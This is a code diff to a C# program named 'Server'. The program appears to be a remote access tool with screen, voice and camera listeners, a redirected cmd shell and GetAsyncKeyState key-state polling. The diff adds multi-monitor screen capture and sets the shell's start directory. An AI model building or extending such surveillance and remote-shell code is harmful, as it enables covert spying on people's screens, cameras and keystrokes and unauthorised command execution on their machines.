@@ -21,6 +21,7 @@ using System.Speech.Synthesis;
 using System.Net.Http;
 using System.Threading;
 
+
 namespace Server
 {
     class Program
@@ -72,7 +73,6 @@ namespace Server
         private static extern short GetAsyncKeyState(int vKey);
 
 
-
         static TcpListener screenListener;
         static TcpListener voiceListener;
         static TcpListener cameraListener;
@@ -103,6 +103,7 @@ namespace Server
         private static Process cmdProcess;
         private static StreamWriter cmdWriter;
         private static StreamReader cmdReader;
+
 
 
         static async Task Main(string[] args)
@@ -139,6 +140,7 @@ namespace Server
             Console.WriteLine("Getting system info...");
             _ = Task.Run(async () => systemInfo = await Task.Run(GetSystemInfo));
 
+
             await Task.WhenAll(
                 IsInfoReady(),
                 AcceptClientsAsync(screenListener, HandleScreenClientAsync),
@@ -172,6 +174,7 @@ namespace Server
             cmdReader = cmdProcess.StandardOutput;
 
             cmdWriter.WriteLine("@echo off");
+            cmdWriter.WriteLine("cd C:/");
             cmdWriter.Flush();
         }
 
@@ -1029,6 +1032,7 @@ namespace Server
                 IsVirtualizationEnabled = hardwareInfo.CpuList.FirstOrDefault()?.VirtualizationFirmwareEnabled == true ? "Yes" : "No"
             };
 
+
             return JsonConvert.SerializeObject(systemInfo, Formatting.Indented);
 
         }
@@ -1160,7 +1164,7 @@ namespace Server
 
 
 
-        static Bitmap CaptureScreen()
+        static Bitmap CaptureScreenOld()
         {
             //muidu ei tööta kui screen scaling on üle 100%
             SetProcessDPIAware();
@@ -1186,6 +1190,65 @@ namespace Server
             screenshot.Dispose();
 
             return resizedScreenshot;
+        }
+
+
+
+
+        static Bitmap CaptureScreen()
+        {
+            SetProcessDPIAware(); //muidu ei tööta kui screen scaling on üle 100%
+
+            // Calculate the bounds that include all screens
+            Rectangle allBounds = GetAllScreensBounds();
+
+            Bitmap screenshot = new Bitmap(allBounds.Width, allBounds.Height);
+
+            using (Graphics g = Graphics.FromImage(screenshot))
+            {
+                // Draw each screen into the bitmap
+                foreach (var screen in Screen.AllScreens)
+                {
+                    Rectangle bounds = screen.Bounds;
+                    g.CopyFromScreen(bounds.Location, new Point(bounds.X - allBounds.X, bounds.Y - allBounds.Y), bounds.Size);
+                }
+
+                // Optionally draw the cursor
+                Cursor currentCursor = Cursors.Default;
+                if (currentCursor != null)
+                {
+                    Point cursorPos = Cursor.Position;
+                    Rectangle cursorBounds = new Rectangle(
+                        cursorPos.X - allBounds.X,
+                        cursorPos.Y - allBounds.Y,
+                        currentCursor.Size.Width,
+                        currentCursor.Size.Height
+                    );
+                    currentCursor.Draw(g, cursorBounds);
+                }
+            }
+
+            Bitmap resizedScreenshot = new Bitmap(screenshot, size);
+            screenshot.Dispose();
+
+            return resizedScreenshot;
+        }
+
+        static Rectangle GetAllScreensBounds()
+        {
+            int minX = int.MaxValue, minY = int.MaxValue;
+            int maxX = int.MinValue, maxY = int.MinValue;
+
+            foreach (var screen in Screen.AllScreens)
+            {
+                Rectangle bounds = screen.Bounds;
+                if (bounds.X < minX) minX = bounds.X;
+                if (bounds.Y < minY) minY = bounds.Y;
+                if (bounds.Right > maxX) maxX = bounds.Right;
+                if (bounds.Bottom > maxY) maxY = bounds.Bottom;
+            }
+
+            return new Rectangle(minX, minY, maxX - minX, maxY - minY);
         }
     }
 
